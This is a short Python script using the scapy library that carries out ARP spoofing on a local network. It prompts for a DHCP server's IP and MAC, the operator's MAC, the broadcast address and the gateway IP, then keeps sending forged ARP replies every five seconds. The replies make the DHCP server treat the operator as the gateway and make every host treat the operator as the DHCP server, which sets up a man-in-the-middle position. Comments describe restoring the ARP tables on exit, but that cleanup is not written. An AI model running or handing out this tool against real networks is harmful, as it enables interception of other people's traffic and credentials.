import os
from scapy.all import *


dhcpserv_ip = input("DHCP IP to spoof: ")
dhcpserv_mac = input("DHCP MAC to spoof: ")
mymac = input("Your MAC: ")
broadcast = input("Network Broadcast Address: ")
gateway_ip = input("Gateway IP: ")
#gateway_mac = input("Gateway MAC: ")

while True:
#tell dhcp I am gateway
    send(ARP(op=ARP.is_at, psrc=gateway_ip, pdst=dhcpserv_ip, hwsrc=mymac))
#tell everyone I am dhcp
    send(ARP(op=ARP.is_at, psrc=dhcpserv_ip, pdst=broadcast, hwsrc=mymac, hwdst="ff:ff:ff:ff:ff:ff"))
#repeat every 5 seconds
    time.sleep(5)


#gratuitous arp to client spoofed so hte gateway is back on its end
    #catch crtl+c and send its rightful data back
